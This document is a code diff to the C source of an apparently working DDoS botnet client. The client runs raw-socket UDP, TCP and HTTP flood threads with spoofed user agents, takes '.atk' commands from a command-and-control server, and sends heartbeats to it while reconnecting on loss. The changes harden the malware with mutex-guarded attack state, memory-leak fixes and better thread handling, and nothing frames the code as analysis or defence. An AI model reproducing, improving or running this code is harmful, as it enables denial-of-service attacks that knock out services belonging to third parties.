@@ -36,7 +36,6 @@
 #define DEFAULT_PPS 100000
 #define DEFAULT_DELAY 1
 #define SOCKETS_PER_THREAD 4
-#define RECONNECT_DELAY 5
 
 static int sock = -1;
 static int running = 1;
@@ -64,6 +63,7 @@ static attack_args_t current_attack = {0};
 volatile int attack_running = 1;
 volatile unsigned long long packets_sent = 0;
 volatile unsigned long long bytes_sent = 0;
+pthread_mutex_t attack_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 const char *user_agents[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -102,7 +102,7 @@ const char *user_agents[] = {
     "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
     "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Facebookbot/1.0; +http://www.facebook.com/facebookbot)",
-    "Mozilla/5.0 (compatible; Twitterbot/1.0; +twitter.com/help/crawling)",
+    "Mozilla/5.0 (compatible; Twitterbot/1.0; +http://twitter.com/help/crawling)",
     "Mozilla/5.0 (compatible; Applebot/1.0; +http://www.apple.com/go/applebot)",
     "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)",
     "Mozilla/5.0 (compatible; SemrushBot/1.0; +http://www.semrush.com/bot.html)",
@@ -163,6 +163,7 @@ unsigned short checksum(unsigned short *buffer, int size) {
 }
 
 unsigned short tcp_checksum(struct tcphdr *tcp, int tcp_len, uint32_t saddr, uint32_t daddr) {
+    uint8_t packet[4096];
     uint32_t sum = 0;
     struct pseudo_header {
         uint32_t source_address;
@@ -350,11 +351,13 @@ void *udp_bypass_flood(void *arg) {
     time_t end_time;
     int error_count = 0;
     int fragment = 0;
+    int should_stop = 0;
 
     for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
         sockfd[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
         if (sockfd[i] < 0) {
             for (int j = 0; j < i; j++) close(sockfd[j]);
+            free(args);
             return NULL;
         }
         int one = 1;
@@ -377,7 +380,15 @@ void *udp_bypass_flood(void *arg) {
     int sent_count = 0;
     int packet_counter = 0;
 
-    while (attack_running && time(NULL) < end_time) {
+    while (!should_stop && time(NULL) < end_time) {
+        pthread_mutex_lock(&attack_mutex);
+        if (!attack_running) {
+            should_stop = 1;
+            pthread_mutex_unlock(&attack_mutex);
+            break;
+        }
+        pthread_mutex_unlock(&attack_mutex);
+
         ip_header = (struct iphdr *)packet;
         udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
         payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
@@ -466,6 +477,7 @@ void *udp_bypass_flood(void *arg) {
     for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
         close(sockfd[i]);
     }
+    free(args);
     return NULL;
 }
 
@@ -481,11 +493,13 @@ void *tcp_bypass_flood(void *arg) {
     int error_count = 0;
     int flags[] = {TH_SYN, TH_ACK, TH_FIN, TH_RST, TH_SYN|TH_ACK, TH_ACK|TH_FIN, TH_SYN|TH_FIN};
     int num_flags = sizeof(flags) / sizeof(flags[0]);
+    int should_stop = 0;
 
     for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
         sockfd[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
         if (sockfd[i] < 0) {
             for (int j = 0; j < i; j++) close(sockfd[j]);
+            free(args);
             return NULL;
         }
         int one = 1;
@@ -508,7 +522,15 @@ void *tcp_bypass_flood(void *arg) {
     int sent_count = 0;
     int packet_counter = 0;
 
-    while (attack_running && time(NULL) < end_time) {
+    while (!should_stop && time(NULL) < end_time) {
+        pthread_mutex_lock(&attack_mutex);
+        if (!attack_running) {
+            should_stop = 1;
+            pthread_mutex_unlock(&attack_mutex);
+            break;
+        }
+        pthread_mutex_unlock(&attack_mutex);
+
         ip_header = (struct iphdr *)packet;
         tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
 
@@ -553,6 +575,7 @@ void *tcp_bypass_flood(void *arg) {
         if (flags[flag_index] & TH_ACK) tcp_header->ack = 1;
         if (flags[flag_index] & TH_FIN) tcp_header->fin = 1;
         if (flags[flag_index] & TH_RST) tcp_header->rst = 1;
+        if (flags[flag_index] & TH_PSH) tcp_header->psh = 1;
         
         tcp_header->window = htons(1024 + (rand() % 64511));
         tcp_header->check = 0;
@@ -615,6 +638,7 @@ void *tcp_bypass_flood(void *arg) {
     for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
         close(sockfd[i]);
     }
+    free(args);
     return NULL;
 }
 
@@ -632,11 +656,13 @@ void *http_bypass_flood(void *arg) {
     int ua_counter = rand() % NUM_USER_AGENTS;
     int error_count = 0;
     int use_post = 0;
+    int should_stop = 0;
 
     for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
         sockfd[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
         if (sockfd[i] < 0) {
             for (int j = 0; j < i; j++) close(sockfd[j]);
+            free(args);
             return NULL;
         }
         int one = 1;
@@ -658,7 +684,15 @@ void *http_bypass_flood(void *arg) {
     int sent_count = 0;
     int packet_counter = 0;
 
-    while (attack_running && time(NULL) < end_time) {
+    while (!should_stop && time(NULL) < end_time) {
+        pthread_mutex_lock(&attack_mutex);
+        if (!attack_running) {
+            should_stop = 1;
+            pthread_mutex_unlock(&attack_mutex);
+            break;
+        }
+        pthread_mutex_unlock(&attack_mutex);
+
         use_post = (rand() % 3 == 0);
         
         if (use_post) {
@@ -761,6 +795,7 @@ void *http_bypass_flood(void *arg) {
     for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
         close(sockfd[i]);
     }
+    free(args);
     return NULL;
 }
 
@@ -771,11 +806,13 @@ void *udp_flood(void *arg) {
     char packet[MAX_PACKET];
     int packet_size;
     time_t end_time;
+    int should_stop = 0;
 
     for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
         sockfd[i] = socket(AF_INET, SOCK_DGRAM, 0);
         if (sockfd[i] < 0) {
             for (int j = 0; j < i; j++) close(sockfd[j]);
+            free(args);
             return NULL;
         }
         int bufsize = 1024 * 1024 * 16;
@@ -793,7 +830,15 @@ void *udp_flood(void *arg) {
     end_time = time(NULL) + args->duration;
     int sent_count = 0;
 
-    while (attack_running && time(NULL) < end_time) {
+    while (!should_stop && time(NULL) < end_time) {
+        pthread_mutex_lock(&attack_mutex);
+        if (!attack_running) {
+            should_stop = 1;
+            pthread_mutex_unlock(&attack_mutex);
+            break;
+        }
+        pthread_mutex_unlock(&attack_mutex);
+
         random_payload((unsigned char *)packet, packet_size);
         
         int sock_idx = rand() % SOCKETS_PER_THREAD;
@@ -814,6 +859,7 @@ void *udp_flood(void *arg) {
     for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
         close(sockfd[i]);
     }
+    free(args);
     return NULL;
 }
 
@@ -824,6 +870,7 @@ void *tcp_flood(void *arg) {
     int packet_size;
     time_t end_time;
     int sent_count = 0;
+    int should_stop = 0;
 
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(args->port);
@@ -835,7 +882,15 @@ void *tcp_flood(void *arg) {
 
     end_time = time(NULL) + args->duration;
 
-    while (attack_running && time(NULL) < end_time) {
+    while (!should_stop && time(NULL) < end_time) {
+        pthread_mutex_lock(&attack_mutex);
+        if (!attack_running) {
+            should_stop = 1;
+            pthread_mutex_unlock(&attack_mutex);
+            break;
+        }
+        pthread_mutex_unlock(&attack_mutex);
+
         int conn = socket(AF_INET, SOCK_STREAM, 0);
         if (conn >= 0) {
             int bufsize = 1024 * 1024 * 16;
@@ -855,6 +910,7 @@ void *tcp_flood(void *arg) {
         }
     }
 
+    free(args);
     return NULL;
 }
 
@@ -865,6 +921,7 @@ void *http_flood(void *arg) {
     int ua_counter = rand() % NUM_USER_AGENTS;
     time_t end_time;
     int sent_count = 0;
+    int should_stop = 0;
 
     target_addr.sin_family = AF_INET;
     target_addr.sin_port = htons(args->port);
@@ -872,7 +929,15 @@ void *http_flood(void *arg) {
 
     end_time = time(NULL) + args->duration;
 
-    while (attack_running && time(NULL) < end_time) {
+    while (!should_stop && time(NULL) < end_time) {
+        pthread_mutex_lock(&attack_mutex);
+        if (!attack_running) {
+            should_stop = 1;
+            pthread_mutex_unlock(&attack_mutex);
+            break;
+        }
+        pthread_mutex_unlock(&attack_mutex);
+
         build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
         
         int conn = socket(AF_INET, SOCK_STREAM, 0);
@@ -893,15 +958,22 @@ void *http_flood(void *arg) {
         }
     }
 
+    free(args);
     return NULL;
 }
 
 void stop_attack() {
+    pthread_mutex_lock(&attack_mutex);
     attack_running = 0;
+    pthread_mutex_unlock(&attack_mutex);
+    
     if (current_attack.attack_thread) {
         pthread_join(current_attack.attack_thread, NULL);
+        current_attack.attack_thread = 0;
     }
+    
     memset(&current_attack, 0, sizeof(current_attack));
+    
     if (sock > 0) {
         send(sock, "ATTACK_STOPPED\n", 15, 0);
     }
@@ -914,9 +986,13 @@ void start_attack(char *cmd) {
     char host[128];
     char path[256];
     
+    pthread_mutex_lock(&attack_mutex);
     if (attack_running) {
+        pthread_mutex_unlock(&attack_mutex);
         stop_attack();
         sleep(1);
+    } else {
+        pthread_mutex_unlock(&attack_mutex);
     }
     
     int parsed = sscanf(cmd, ".atk %63s %d %d %31s %d %d %d %d",
@@ -938,9 +1014,11 @@ void start_attack(char *cmd) {
     if (size > 65507) size = 65507;
     if (size < 64) size = 64;
     
+    pthread_mutex_lock(&attack_mutex);
     attack_running = 1;
     packets_sent = 0;
     bytes_sent = 0;
+    pthread_mutex_unlock(&attack_mutex);
     
     strcpy(current_attack.target, target);
     current_attack.port = port;
@@ -991,7 +1069,9 @@ void start_attack(char *cmd) {
             if (sock > 0) {
                 send(sock, "ERROR: Unknown method\n", 22, 0);
             }
+            pthread_mutex_lock(&attack_mutex);
             attack_running = 0;
+            pthread_mutex_unlock(&attack_mutex);
             return;
         }
     } else {
@@ -1009,22 +1089,49 @@ void start_attack(char *cmd) {
             if (sock > 0) {
                 send(sock, "ERROR: Unknown method\n", 22, 0);
             }
+            pthread_mutex_lock(&attack_mutex);
             attack_running = 0;
+            pthread_mutex_unlock(&attack_mutex);
             return;
         }
     }
     
-    for (int i = 0; i < threads; i++) {
+    if (threads > 1) {
+        for (int i = 0; i < threads; i++) {
+            attack_args_t *thread_arg = malloc(sizeof(attack_args_t));
+            memcpy(thread_arg, &current_attack, sizeof(attack_args_t));
+            thread_arg->thread_id = i;
+            
+            pthread_t thread;
+            if (pthread_create(&thread, NULL, attack_func, thread_arg) != 0) {
+                free(thread_arg);
+                if (sock > 0) {
+                    send(sock, "ERROR: Failed to start attack\n", 30, 0);
+                }
+                pthread_mutex_lock(&attack_mutex);
+                attack_running = 0;
+                pthread_mutex_unlock(&attack_mutex);
+                return;
+            }
+            pthread_detach(thread);
+            
+            if (i == 0) {
+                current_attack.attack_thread = thread;
+            }
+        }
+    } else {
         attack_args_t *thread_arg = malloc(sizeof(attack_args_t));
         memcpy(thread_arg, &current_attack, sizeof(attack_args_t));
-        thread_arg->thread_id = i;
+        thread_arg->thread_id = 0;
         
         if (pthread_create(&current_attack.attack_thread, NULL, attack_func, thread_arg) != 0) {
             free(thread_arg);
             if (sock > 0) {
                 send(sock, "ERROR: Failed to start attack\n", 30, 0);
             }
+            pthread_mutex_lock(&attack_mutex);
             attack_running = 0;
+            pthread_mutex_unlock(&attack_mutex);
             return;
         }
         pthread_detach(current_attack.attack_thread);
@@ -1060,9 +1167,6 @@ int connect_to_cnc() {
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) return -1;
     
-    int flag = 1;
-    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
-    
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(CNC_PORT);
     if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) <= 0) {
@@ -1076,6 +1180,9 @@ int connect_to_cnc() {
         sock = -1;
         return -1;
     }
+    
+    int flag = 1;
+    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
     
     char hbt[256];
     snprintf(hbt, sizeof(hbt), "HBT|%s|%s\n", arch, version);
@@ -1092,15 +1199,12 @@ void reconnect_loop() {
     fd_set readfds;
     struct timeval tv;
     char buffer[BUFFER_SIZE];
-    int reconnect_attempts = 0;
     
     while (running) {
         if (sock < 0) {
-            if (connect_to_cnc() == 0) {
-                reconnect_attempts = 0;
-            } else {
-                reconnect_attempts++;
-                sleep(RECONNECT_DELAY);
+            connect_to_cnc();
+            if (sock < 0) {
+                sleep(5);
                 continue;
             }
         }
